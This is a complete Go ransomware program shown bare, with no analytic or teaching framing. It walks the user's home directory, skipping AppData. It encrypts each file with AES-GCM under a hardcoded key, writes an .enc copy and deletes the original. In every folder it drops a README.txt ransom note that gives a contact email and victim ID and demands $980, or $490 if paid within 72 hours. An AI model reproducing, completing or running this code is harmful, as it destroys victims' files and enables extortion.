package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	// Initialize AES in GCM mode with the provided secret key
	key := []byte("fH3AqUDw0FaEMG3_LJLOAB1nnigzOGmV")
	block, err := aes.NewCipher(key)
	if err != nil {
		panic("Error while setting up AES")
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("Error while setting up GCM")
	}

	// Define the base path as the user's home directory
	basePath, err := os.UserHomeDir()
	if err != nil {
		panic("Could not determine user's home directory")
	}

	// Define the AppData path to exclude
	appDataPath := filepath.Join(basePath, "AppData")

	// Encrypt files and create README.txt in each directory except AppData
	err = filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Printf("Error accessing path %s: %v\n", path, err)
			return nil
		}

		// Skip the AppData folder
		if strings.HasPrefix(path, appDataPath) {
			return filepath.SkipDir
		}

		if info.IsDir() {
			// Create README.txt in the directory with custom content
			readmePath := filepath.Join(path, "README.txt")
			readmeContent := []byte(`
ATTENTION!

All your important files have been encrypted with a strong encryption algorithm.
The only way to recover your files is to purchase the decryption tool and unique key.

To restore your data:

1. Contact us via email at: xgwhcobbvesaiaifjg@poplk.com
2. Send us your personal ID: 0303Ryd6SKDGn5TP9vnpZLBRq3EcieZRXsqnyxGjMgLARvWwAbG2V1

What guarantees you have?
You can send one of your encrypted file from your PC and we decrypt it for free.
But we can decrypt only 1 file for free. File must not contain valuable information.

Payment Details:

Decryption Price: $980
Discount Price 50% (if payment is made within 72 hours): $490

WARNING:

Do NOT attempt to modify or decrypt the files yourself; this may result in permanent data loss.
We will not restore your data without payment.
`)
			err := os.WriteFile(readmePath, readmeContent, 0644)
			if err != nil {
				fmt.Printf("Error creating README.txt in %s: %v\n", path, err)
			}
		} else {
			// Encrypt the file
			fmt.Println("Encrypting " + path + "...")

			// Read file contents
			original, err := os.ReadFile(path)
			if err != nil {
				fmt.Printf("Error reading file %s: %v\n", path, err)
				return nil
			}

			// Encrypt file contents
			nonce := make([]byte, gcm.NonceSize())
			if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
				fmt.Printf("Error generating nonce for file %s: %v\n", path, err)
				return nil
			}
			encrypted := gcm.Seal(nonce, nonce, original, nil)

			// Write encrypted contents
			encPath := path + ".enc"
			err = os.WriteFile(encPath, encrypted, 0644)
			if err != nil {
				fmt.Printf("Error writing encrypted file %s: %v\n", encPath, err)
				return nil
			}

			// Remove the original file
			err = os.Remove(path)
			if err != nil {
				fmt.Printf("Error deleting original file %s: %v\n", path, err)
			}
		}
		return nil
	})

	if err != nil {
		fmt.Printf("Error during file encryption: %v\n", err)
	} else {
		fmt.Println("Encryption process completed.")
	}
}

